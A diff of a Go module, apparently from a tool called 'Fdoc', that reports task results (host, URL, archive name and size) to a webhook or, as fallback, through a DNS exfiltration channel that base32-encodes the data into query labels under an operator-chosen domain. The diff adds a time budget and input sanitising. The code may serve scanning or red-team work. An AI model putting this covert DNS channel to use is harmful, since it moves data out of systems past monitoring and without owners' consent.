@@ -12,6 +12,8 @@ import (
 	"net/url"
 	"strings"
 	"time"
+
+	"Fdoc/utils"
 )
 
 // Payload is sent via webhook JSON and/or DNS exfil.
@@ -20,7 +22,7 @@ type Payload struct {
 	Host      string `json:"host"`
 	URL       string `json:"url"`
 	Backend   string `json:"backend"`
-	Archive   string `json:"archive"`
+	Archive   string `json:"archive"` // basename only (no full path)
 	Size      int64  `json:"size"`
 	Files     int    `json:"files"`
 	Truncated bool   `json:"truncated"`
@@ -31,7 +33,7 @@ type Payload struct {
 type Options struct {
 	Webhook string
 	DNS     string
-	Timeout time.Duration
+	Timeout time.Duration // webhook timeout and total DNS exfil budget
 }
 
 // Result describes which channels succeeded.
@@ -40,7 +42,7 @@ type Result struct {
 	DNSOK     bool
 }
 
-// Notify sends payload: webhook first, then DNS on failure or if webhook unset.
+// Notify sends payload: webhook first, then DNS on failure or if webhook unset (failover, not dual-send).
 // DNS success requires every chunk query to be sent (NXDOMAIN counts; timeout does not).
 func Notify(ctx context.Context, p Payload, opts Options) (Result, error) {
 	if opts.Timeout <= 0 {
@@ -49,6 +51,7 @@ func Notify(ctx context.Context, p Payload, opts Options) (Result, error) {
 	if p.TS == 0 {
 		p.TS = time.Now().Unix()
 	}
+	p.Host = sanitizePayloadHost(p.Host)
 
 	var res Result
 	var errs []string
@@ -63,7 +66,7 @@ func Notify(ctx context.Context, p Payload, opts Options) (Result, error) {
 	}
 
 	if opts.DNS != "" {
-		if err := sendDNS(ctx, opts.DNS, p); err != nil {
+		if err := sendDNS(ctx, opts.DNS, p, opts.Timeout); err != nil {
 			errs = append(errs, "dns: "+err.Error())
 		} else {
 			res.DNSOK = true
@@ -86,7 +89,7 @@ func sendWebhook(ctx context.Context, rawURL string, timeout time.Duration, p Pa
 	case "https":
 		// ok
 	case "http":
-		if !isLoopbackHost(u.Hostname()) {
+		if !utils.IsLoopbackHost(u.Hostname()) {
 			return fmt.Errorf("webhook must use https (http only allowed for loopback)")
 		}
 	default:
@@ -124,18 +127,9 @@ func sendWebhook(ctx context.Context, rawURL string, timeout time.Duration, p Pa
 	return nil
 }
 
-func isLoopbackHost(host string) bool {
-	host = strings.TrimSpace(strings.ToLower(host))
-	if host == "localhost" || host == "127.0.0.1" || host == "::1" {
-		return true
-	}
-	ip := net.ParseIP(host)
-	return ip != nil && ip.IsLoopback()
-}
-
 // DNS wire format: base32(no pad) of "task_id|host|url", chunked into labels.
 // Query: <seq>-<total>-<chunk>.<task_id>.<dns-base>
-func sendDNS(ctx context.Context, base string, p Payload) error {
+func sendDNS(ctx context.Context, base string, p Payload, budget time.Duration) error {
 	base = strings.TrimSuffix(strings.TrimSpace(base), ".")
 	if base == "" {
 		return fmt.Errorf("empty dns base")
@@ -144,8 +138,11 @@ func sendDNS(ctx context.Context, base string, p Payload) error {
 	if task == "" {
 		return fmt.Errorf("task_id %q is empty after DNS sanitize", p.TaskID)
 	}
+	if budget <= 0 {
+		budget = 15 * time.Second
+	}
 
-	raw := p.TaskID + "|" + p.Host + "|" + p.URL
+	raw := p.TaskID + "|" + sanitizePayloadHost(p.Host) + "|" + p.URL
 	encoded := strings.TrimRight(base32.StdEncoding.EncodeToString([]byte(raw)), "=")
 	encoded = strings.ToLower(encoded)
 
@@ -154,9 +151,14 @@ func sendDNS(ctx context.Context, base string, p Payload) error {
 		return fmt.Errorf("empty dns payload")
 	}
 
+	deadline := time.Now().Add(budget)
 	resolver := net.DefaultResolver
 	var failed []string
 	for i, chunk := range chunks {
+		remain := time.Until(deadline)
+		if remain <= 0 {
+			return fmt.Errorf("dns exfil budget exceeded at chunk %d/%d", i, len(chunks))
+		}
 		if len(chunk) > 63 {
 			return fmt.Errorf("dns chunk %d label too long (%d)", i, len(chunk))
 		}
@@ -164,7 +166,11 @@ func sendDNS(ctx context.Context, base string, p Payload) error {
 		if len(name) > 253 {
 			return fmt.Errorf("dns name too long (%d): chunk %d", len(name), i)
 		}
-		lookupCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
+		per := 5 * time.Second
+		if remain < per {
+			per = remain
+		}
+		lookupCtx, cancel := context.WithTimeout(ctx, per)
 		_, err := resolver.LookupHost(lookupCtx, name)
 		cancel()
 		if err == nil {
@@ -214,10 +220,15 @@ func sanitizeDNSLabel(s string) string {
 	return out
 }
 
+// sanitizePayloadHost strips '|' so DNS wire format task|host|url stays unambiguous.
+func sanitizePayloadHost(host string) string {
+	return strings.ReplaceAll(host, "|", "")
+}
+
 // EncodeDNSChunks exposes chunking for tests.
 func EncodeDNSChunks(taskID, host, url string) (taskLabel string, chunks []string) {
 	taskLabel = sanitizeDNSLabel(taskID)
-	raw := taskID + "|" + host + "|" + url
+	raw := taskID + "|" + sanitizePayloadHost(host) + "|" + url
 	encoded := strings.TrimRight(base32.StdEncoding.EncodeToString([]byte(raw)), "=")
 	encoded = strings.ToLower(encoded)
 	return taskLabel, chunkString(encoded, 40)
